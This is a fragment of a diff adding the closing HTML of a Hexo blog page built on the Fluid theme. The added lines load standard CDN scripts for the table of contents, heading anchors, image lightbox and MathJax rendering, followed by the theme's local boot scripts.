+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
